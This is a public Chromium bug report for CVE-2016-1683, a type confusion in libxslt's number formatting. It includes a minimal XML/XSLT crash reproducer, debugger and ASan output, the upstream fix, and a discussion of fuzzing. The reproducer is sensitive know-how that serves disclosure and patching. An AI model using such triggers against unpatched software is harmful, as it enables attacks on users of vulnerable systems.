# Security: Type confusion and UAF in libxslt

| Field | Value |
|-------|-------|
| **Issue ID** | [40083612](https://issues.chromium.org/issues/40083612) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>XML |
| **CVE IDs** | CVE-2016-1683 |
| **Reporter** | ni...@gmail.com |
| **Assignee** | do...@chromium.org |
| **Created** | 2016-02-02 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

Apparent type confusion in libxslt, leading to heap UAF  

I don't understand what is really going on...

**VERSION**

Chrome Version: release+asan+symbolized v371829  

Operating System: Ubuntu x64

**REPRODUCTION CASE**

Live PoC: <http://nicob.net/chrome-Ezeil0hi/Bug-1/NumberFormatGetMultipleLevel.xml>

# XML

<?xml-stylesheet type="text/xsl" href="NumberFormatGetMultipleLevel.xsl"?>
<top xmlns:a="AAAA" xmlns:b="BBBB" xmlns:c="CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC">
<foo/>
<bar/>
</top>
# XSLT

<xsl:stylesheet version="1.0" xmlns:xsl="[http://www.w3.org/1999/XSL/Transform">](http://www.w3.org/1999/XSL/Transform%22%3E)  

<xsl:template match="\*/\*">  

<xsl:for-each select="namespace::\*">  

[xsl:number/](javascript:void(0);)  

</xsl:for-each>  

</xsl:template>  

</xsl:stylesheet>

ADDITIONAL INFORMATION

Chrome stack-trace is attached. The following GDB session (using CLI xsltproc) shows the type confusion in effect:

(gdb) b xsltNumberFormatGetMultipleLevel  

(gdb) r  

(gdb) c  

(gdb) p \*node  

$2 = {  

\_private = 0x60180000b440,  

type = XML\_NAMESPACE\_DECL,  

name = 0x600800009310 'C' <repeats 39 times>,  

children = 0x60040000c390,  

last = 0x0,  

parent = 0x0,  

next = 0x2ffffff00000002,  

prev = 0xb00000100000025,  

doc = 0x772f2f3a70747468,  

ns = 0x726f2e33772e7777,  

content = 0x39312f4c4d582f67 <error: Cannot access memory at address 0x39312f4c4d582f67>,  

properties = 0x73656d616e2f3839,  

nsDef = 0x65636170,  

psvi = 0x0,  

line = 2,  

extra = 0  

}  

(gdb) c  

(gdb) p \*node  

$3 = {  

\_private = 0x60180000b440,  

type = XML\_NAMESPACE\_DECL,  

name = 0x60040000c370 "BBBB",  

children = 0x60040000c350,  

last = 0x0,  

parent = 0x0,  

next = 0x2ffffff00000002,  

prev = 0xb00000100000028,  

doc = 0x4343434343434343,  

ns = 0x4343434343434343,  

content = 0x4343434343434343 <error: Cannot access memory at address 0x4343434343434343>,  

properties = 0x4343434343434343,  

nsDef = 0x43434343434343,  

psvi = 0x0,  

line = 2,  

extra = 0  

}  

(gdb) c  

(gdb) c  

==3024== ERROR: AddressSanitizer: heap-use-after-free on address 0x600800009198 at pc 0x7ffff4bf4be2 bp 0x7fffffff7550 sp 0x7fffffff7548  

READ of size 8 at 0x600800009198 thread T0  

#0 0x7ffff4bf4be1 in xsltNumberFormatGetMultipleLevel /home/x/libxslt-1.1.28/libxslt/numbers.c:662  

#1 0x7ffff4bf69d7 in xsltNumberFormat /home/x/libxslt-1.1.28/libxslt/numbers.c:794  

#2 0x7ffff4c0e04f in xsltNumber /home/x/libxslt-1.1.28/libxslt/transform.c:4599  

#3 0x7ffff4c0eaa3 in xsltApplySequenceConstructor /home/x/libxslt-1.1.28/libxslt/transform.c:2647  

#4 0x7ffff4c129ac in xsltForEach /home/x/libxslt-1.1.28/libxslt/transform.c:5738

## Attachments

- [xsltNumberFormatGetMultipleLevel-UAF.txt](attachments/xsltNumberFormatGetMultipleLevel-UAF.txt) (text/plain, 24.0 KB)

## Timeline

### cl...@chromium.org (2016-02-02)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5309201817010176

### cl...@chromium.org (2016-02-02)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=6712313094078464

### mm...@chromium.org (2016-02-02)

fmalita@, I saw that you did some fixes related to libxlst previously. Could you please take a look here or suggest any other owner?

### fm...@chromium.org (2016-02-02)

If I touched libxslt it must have been long ago, as I have no recollection :)

Reassigning to listed libxslt owner for triage.

### ni...@gmail.com (2016-02-03)

Maybe that veillard@gmail.com (libxslt author) should be cc'ed...

### oc...@chromium.org (2016-02-23)

Ping. any updates here? Note that the crash in https://crbug.com/chromium/583156#c1 did reproduce on CF, but wasn't marked as "Reproducible" because of the flakiness and as a result it did not get added as a comment here.

### mm...@google.com (2016-03-03)

[Empty comment from Monorail migration]

### do...@chromium.org (2016-03-04)

[Empty comment from Monorail migration]

### dd...@apple.com (2016-03-05)

This reproduces on upstream trunk libxslt (fc1ff481fd01e9a65a921c542fed68d8c965e8a3).


### ni...@gmail.com (2016-03-20)

This bug was reported nearly 50 days... Why not adding libxslt maintainer to the thread (cf https://crbug.com/chromium/583156#c5)?

### me...@chromium.org (2016-03-21)

CC'ing veillard@gmail.com upon request from the reporter.

### me...@chromium.org (2016-03-21)

+wellnhofer@aevum.de, another libxslt maintainer

### we...@aevum.de (2016-03-22)

Fixed with the following commit:

https://git.gnome.org/browse/libxslt/commit/?id=d182d8f6ba3071503d96ce17395c9d55871f0242

The root cause of this bug is a terrible hack in libxml2's XPath engine: namespace nodes are actually an xmlNs, not an xmlNode. This resulted in a out-of-bounds heap access (not a UAF). A machine word beyond the end of the xmlNs struct was compared with itself which seems relatively harmless.

But I wouldn't be surprised if similar issues turn up with namespace nodes. If anyone is fuzzing libxslt, it's a good idea to work with XPath expressions like "namespace::*".

### me...@chromium.org (2016-03-23)

@wellnhofer: Thanks for the quick fix!

### do...@chromium.org (2016-04-02)

Brief update: I'm working on rolling this here:

https://codereview.chromium.org/1848793005

Should happen on Monday.

### do...@chromium.org (2016-04-04)

Up for review here: https://codereview.chromium.org/1853083002

### bu...@chromium.org (2016-04-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab

commit 96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab
Author: dominicc <dominicc@chromium.org>
Date: Wed Apr 06 00:16:28 2016

Roll libxslt to 891681e3e948f31732229f53cb6db7215f740fc7

BUG=583156,583171

Review URL: https://codereview.chromium.org/1853083002

Cr-Commit-Position: refs/heads/master@{#385338}

[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/COPYING
[delete] https://crrev.com/5d32c4d7ac9cd3e4a45a5cc1fc547103b66816c7/third_party/libxslt/ChangeLog
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/HACKING
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/MAINTAINERS
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/Makefile.in
[delete] https://crrev.com/5d32c4d7ac9cd3e4a45a5cc1fc547103b66816c7/third_party/libxslt/NEWS
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/NOTES
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/README.chromium
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/README.cvs-commits
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/aclocal.m4
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/compile
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/config.guess
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/config.sub
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/configure
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/configure.in
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/depcomp
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/install-sh
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libexslt/Makefile.in
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libexslt/crypto.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libexslt/date.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libexslt/functions.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libexslt/strings.c
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt.doap
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/Makefile.in
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/attributes.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/extensions.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/functions.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/imports.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/keys.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/libxslt.h
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/namespaces.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/numbers.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/pattern.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/preproc.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/transform.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/variables.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/win32config.h
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/xslt.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/xsltInternals.h
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/xsltconfig.h
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/xsltconfig.h.in
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/xsltutils.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/xsltutils.h
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/COPYING
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/Makefile
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/config.h
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/config.log
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libexslt.pc
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libexslt/Makefile
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libexslt/exsltconfig.h
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libxslt.pc
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libxslt.spec
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libxslt/Makefile
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libxslt/xsltwin32config.h
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/stamp-h1
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/ltmain.sh
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/mac/config.h
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/missing
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/win32/Makefile.msvc
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/win32/config.h
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/win32/runtests.py
[delete] https://crrev.com/5d32c4d7ac9cd3e4a45a5cc1fc547103b66816c7/third_party/libxslt/xslt-config.in
[delete] https://crrev.com/5d32c4d7ac9cd3e4a45a5cc1fc547103b66816c7/third_party/libxslt/xsltproc/Makefile.am
[delete] https://crrev.com/5d32c4d7ac9cd3e4a45a5cc1fc547103b66816c7/third_party/libxslt/xsltproc/testThreads.c
[delete] https://crrev.com/5d32c4d7ac9cd3e4a45a5cc1fc547103b66816c7/third_party/libxslt/xsltproc/xsltproc.c


### do...@chromium.org (2016-04-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-04-06)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

Your fix is very close to the branch point. After the branch happens, please make sure to check if your fix is in.

- Your friendly ClusterFuzz

### do...@chromium.org (2016-04-12)

Hmm, clusterfuzz y u no verify this?

### sh...@chromium.org (2016-04-14)

[Empty comment from Monorail migration]

### ti...@google.com (2016-04-21)

Merge-Requested label isn't a valid merge request, pls either clean it up or use a valid label. Thanks.

### do...@chromium.org (2016-04-22)

@tinazh, see https://crbug.com/chromium/583156#c19. Clusterfuzz is telling people to add this label.

### ti...@google.com (2016-05-09)

#23: Change from "Merge-Requested" to "Merge-Request-XX, where XX is the Chrome milestone" is in progress.

### ti...@google.com (2016-05-09)

[Automated comment] Commit may have occurred before M51 branch point (4/8/2016), needs manual review.

### ti...@google.com (2016-05-09)

...and it's already in M51. Updating labels.

### ti...@google.com (2016-05-25)

[Comment Deleted]

### ti...@google.com (2016-05-25)

Thanks for reporting this issue. Our reward panel decided to award you $1,000 for this report. Congratulations!

We've credited you in our release notes as "Nicolas Gregoire": https://googlechromereleases.blogspot.com/2016/05/stable-channel-update_25.html - if you'd like to use a different name, please let me know.

Someone from our finance team will be in contact to collect details for payment within 7 days. If that doesn't happen, please either update this bug or contact me at timwillis@.

The CVE-ID for this issue is CVE-2016-1683. Usual boilerplate text below - let me know if you have any questions.

Thanks again for the report!


*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an established charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

### kc...@chromium.org (2016-05-26)

Is it possible to fuzz libxslt with libFuzzer? 
https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/README.md

### dd...@apple.com (2016-05-26)

> Is it possible to fuzz libxslt with libFuzzer? 

There are certainly APIs that libxslt exposes that could be used to fuzz libxslt.  The biggest challenge may be managing two separate pools of corpuses for one task:  an XML document corpus and an XSLT document corpus.  I suppose one could also do something where one document type is held fixed (XML), and the other one is managed as a corpus (XSLT), but you'd want to use more than a single XML document to fuzz over a period of time.


### kc...@chromium.org (2016-05-26)

I would handle it this way: treat the input byte array as a pair of xml+xslt separated by some 8-byte magic delimiter. If the delimiter is not present (killed by mutations) the input will be rejected right away. 
A minor challenge will be to prepare a rich initial input corpus for such target, 
after that fuzzing should be smooth. 
I don't have enough xslt knowledge to create such target code, anyone?

### ai...@chromium.org (2016-05-26)

I tried this. Fuzzer never discovers any valid XSLT even with valid corpus. The xslt format is too brittle and demanding (it has to be valid xml and valid xslt).

The other problem (yet potential) is that xslt processing doesn't have to be linear.

### kc...@chromium.org (2016-05-26)

I did not say it's simple. We'll likely need a dictionary for xslt and a very 
good seed corpus. 

### dd...@apple.com (2016-05-27)

You could start the corpus with built-in (non-error) tests for libxslt.  (Are there any other XSL[T] test suites available as open source or otherwise freely distributed?)

At Google, maybe you could find example URLs (via the search engine index) that return application/xml (or text/xml) content with associated stylesheets, and use that.  For example, here's a web page from OpenGL.org that might serve as an example:  <https://www.opengl.org/sdk/docs/man2/xhtml/gluPerspective.xml>

Nick Wellnhofer has been fuzzing (or knows someone who has been fuzzing) using AFL and ASan as he's been fixing libxslt bugs found by fuzzing.  Maybe there is some information he can share?


### we...@aevum.de (2016-05-27)

Yes, I've been fuzzing libxslt but it's still a work in progress. I can share some ideas on the libxslt mailing list. This private bug report is not the right forum.

### ti...@google.com (2016-06-08)

[Empty comment from Monorail migration]

### ti...@google.com (2016-06-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-07-13)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/583156?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083612)*
